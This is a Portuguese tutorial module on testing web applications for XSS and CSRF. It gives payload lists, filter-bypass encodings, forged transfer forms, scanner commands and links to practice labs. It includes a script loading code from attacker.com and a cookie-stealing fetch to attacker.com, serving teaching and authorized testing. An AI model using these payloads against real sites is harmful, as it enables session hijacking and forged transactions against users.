# XSS e CSRF

> Cross-Site Scripting (Stored, Reflected, DOM-based) e Cross-Site Request Forgery.

---

## Instalação das Ferramentas

```bash
# XSStrike (detecção de XSS)
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip3 install -r requirements.txt

# Dalfox (XSS scanner)
go install github.com/hahwul/dalfox/v2@latest

# Burp Suite (proxy e scanner)
# Baixe de https://portswigger.net/burp/communityupdate

# browser-proxy para testes
# Use FoxyProxy no Firefox para configurar proxy
```

---

## Tipos de XSS

### 1. Reflected XSS
O payload está na URL e é refletido na página.

#### Como testar
```bash
# Testar em parâmetros de query
http://target.com/search?q=<script>alert(1)</script>
http://target.com/page?name=<img src=x onerror=alert(1)>
http://target.com/redirect?url=javascript:alert(1)

# Testar em parâmetros de POST
curl -X POST http://target.com/search \
  -d "q=<script>alert(1)</script>"

# Testar em headers
curl -H "Referer: <script>alert(1)</script>" http://target.com/
curl -H "User-Agent: <script>alert(1)</script>" http://target.com/
curl -H "X-Forwarded-For: <script>alert(1)</script>" http://target.com/
```

#### Payloads Comuns
```html
<!-- Tag script -->
<script>alert(1)</script>
<script src=http://attacker.com/evil.js></script>

<!-- Event handlers -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>

<!-- JavaScript URL -->
javascript:alert(1)
javascript:alert(document.cookie)

<!-- SVG -->
<svg/onload=alert(1)>
<svg><script>alert(1)</script></svg>
```

### 2. Stored XSS
O payload é armazenado no servidor e exibido para outros usuários.

#### Como testar
```bash
# Testar em campos de formulário
# 1. Encontrar formulários de comentario, perfil, mensagem
# 2. Inserir payload em cada campo
# 3. Verificar se é exibido para outros usuários

# Exemplo: perfil de usuário
curl -X POST http://target.com/profile \
  -H "Content-Type: application/json" \
  -d '{"name": "<script>alert(1)</script>"}'

# Exemplo: comentario
curl -X POST http://target.com/comments \
  -d "comment=<img src=x onerror=alert(1)>"
```

#### Locais Comuns para Stored XSS
- Perfis de usuário (nome, bio, avatar)
- Comentários
- Mensagens privadas
- Títulos de posts
- Descrições de produtos
- Nomes de arquivos uploadados

### 3. DOM-based XSS
O payload é executado no lado do cliente via JavaScript.

#### Como testar
```bash
# Identificar fontes de dados perigosas
# - document.URL
# - document.documentURI
# - document.referrer
# - location.href
# - location.search
# - location.hash
# - window.name

# Identificar sumidouros perigosos
# - eval()
# - setTimeout()
# - setInterval()
# - document.write()
# - innerHTML
# - outerHTML
# - jQuery.html()
```

#### Exemplo de Código Vulnerável
```javascript
// Código vulnerável
var name = document.URL.substring(document.URL.indexOf("name=") + 5);
document.getElementById("output").innerHTML = "Olá, " + name;

// Payload: ?name=<img src=x onerror=alert(1)>
```

#### Como Explorar
```bash
# 1. Analisar o JavaScript da página
# 2. Encontrar onde os dados da URL são usados
# 3. Injetar payload que será processado pelo JavaScript

# Exemplo
http://target.com/page#<img src=x onerror=alert(1)>
http://target.com/page?name=<script>alert(1)</script>
```

---

## Bypass de Filtros

### Encoding
```html
<!-- HTML encoding -->
&#60;script&#62;alert(1)&#60;/script&#62;

<!-- URL encoding -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Unicode encoding -->
\u003cscript\u003ealert(1)\u003c/script\u003e
```

### Case Manipulation
```html
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
<sCrIpT>alert(1)</sCrIpT>
```

### Bypass de Tags
```html
<!-- Sem usar <script> -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

### Bypass de Event Handlers
```html
<!-- Sem usar onerror, onload -->
<input onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<button onclick=alert(1)>Click
<div onmouseover=alert(1)>Hover
```

---

## CSRF (Cross-Site Request Forgery)

### Como Funciona
```html
<!-- CSRF via formulário -->
<form action="http://target.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
  <input type="submit" value="Clique para ganhar prêmio!">
</form>

<!-- CSRF via imagem -->
<img src="http://target.com/transfer?to=attacker&amount=10000">

<!-- CSRF via AJAX -->
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://target.com/transfer", true);
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send("to=attacker&amount=10000");
</script>
```

### Como Testar
```bash
# 1. Identificar ações sensíveis
# - Transferência de dinheiro
# - Alteração de email/senha
# - Exclusão de conta
# - Compra de itens

# 2. Verificar se há proteção CSRF
# - Token CSRF no formulário
# - SameSite cookie
# - Verificação de Origin/Referer

# 3. Testar sem token
curl -X POST http://target.com/transfer \
  -d "to=attacker&amount=10000"

# 4. Testar com token inválido
curl -X POST http://target.com/transfer \
  -H "X-CSRF-Token: invalid_token" \
  -d "to=attacker&amount=10000"
```

### Bypass de Proteções CSRF
```bash
# Bypass via SameSite=none
# Se o cookie não tem SameSite, pode ser enviado cross-site

# Bypass via subdomínio
# Se attacker.com é subdomínio de target.com

# Bypass via header
curl -X POST http://target.com/transfer \
  -H "Origin: http://attacker.com" \
  -d "to=attacker&amount=10000"
```

---

## Ferramentas de Automação

### XSStrike
```bash
# Scan básico
python3 xsstrike.py -u "http://target.com/search?q=test"

# Com cookies
python3 xsstrike.py -u "http://target.com/search?q=test" --cookie="session=abc123"

# Com headers customizados
python3 xsstrike.py -u "http://target.com/search?q=test" --headers="X-Forwarded-For: 127.0.0.1"

# Fuzzing de parâmetros
python3 xsstrike.py -u "http://target.com/" --fuzzer
```

### Dalfox
```bash
# Scan básico
dalfox url "http://target.com/search?q=test"

# Com parâmetros
dalfox url "http://target.com/search?q=test" --param "q"

# Com wordlist
dalfox url "http://target.com/" --path wordlist.txt

# Com proxy
dalfox url "http://target.com/search?q=test" --proxy http://127.0.0.1:8080
```

---

## Lab Prático

### Exercício 1: XSS Challenge
- **Plataforma:** TryHackMe
- **Link:** https://tryhackme.com/room/xss
- **O que vai praticar:** Reflected, Stored e DOM-based XSS
- **Tempo estimado:** 60 min

### Exercício 2: CSRF Challenge
- **Plataforma:** PortSwigger
- **Link:** https://portswigger.net/web-security/csrf
- **O que vai praticar:** CSRF, bypass de proteções
- **Tempo estimado:** 45 min

### Dica de Estudo
> XSS é uma das vulnerabilidades mais comuns. Sempre teste todos os inputs e verifique se o payload é executado no navegador.

---

**Próximo:** [02-seguranca-de-aplicacoes.md](02-seguranca-de-aplicacoes.md)

---

### Resumo da ordem — Por que essa sequência?

XSS e CSRF segue: **identificar → testar → explorar → demonstrar impacto**.

```
PASSO 1: Identificar inputs → Encontrar onde o navegador reflete dados
├── POR QUE: XSS só existe se o input do usuário é exibido sem sanitização
├── O QUE FAZER: Testar parâmetros de URL, formulários, headers
├── COMANDO: curl "http://target.com/search?q=<script>alert(1)</script>"
├── QUANDO AVANÇAR: Quando encontrar input que reflete na página
└── SE DER ERRADO: Se não refletir, teste outros parâmetros ou DOM-based

        ↓

PASSO 2: Testar XSS → Verificar se payload executa
├── POR QUE: Nem toda refletição é vulnerável — precisa executar JS
├── O QUE FAZER: Testar payloads básicos e variantes
├── COMANDO: use browser para testar http://target.com/?q=<script>alert(1)</script>
├── QUANDO AVANÇAR: Quando alert() disparar no navegador
└── DICAS: Teste Reflected, Stored e DOM-based separadamente

        ↓

PASSO 3: Bypass de filtros → Evitar sanitização
├── POR QUE: Aplicações filtram <script> mas podem deixar passar outros
├── O QUE FAZER: Usar encoding, event handlers, tags alternativas
├── COMANDO: testar <img src=x onerror=alert(1)>, <svg onload=alert(1)>
├── QUANDO AVANÇAR: Quando bypass funcionar
└── SE DER ERRADO: Se CSP bloquear, teste bypass via JSONP ou domínios confiáveis

        ↓

PASSO 4: Testar CSRF → Verificar proteção em ações sensíveis
├── POR QUE: CSRF permite executar ações como outro usuário
├── O QUE FAZER: Verificar token CSRF, SameSite cookie, Origin/Referer
├── COMANDO: curl -X POST http://target.com/transfer -d "to=attacker&amount=10000"
├── QUANDO AVANÇAR: Se aceitar sem token = vulnerável
└── DICAS: Foque em: transferências, troca de senha, exclusão de conta

        ↓

PASSO 5: Demonstrar impacto → Roubar dados ou sessão
├── POR QUE: Provar risco real para o time de segurança
├── O QUE FAZER: Criar PoC que rouba cookie ou executa ação
├── COMANDO: <script>fetch('http://attacker.com/steal?c='+document.cookie)</script>
├── QUANDO AVANÇAR: Quando tiver evidência de impacto
└── SE DER ERRADO: Se HttpOnly bloquear cookie, tente roubar token via AJAX
```

---

**Próximo:** [02-seguranca-de-aplicacoes.md](02-seguranca-de-aplicacoes.md)
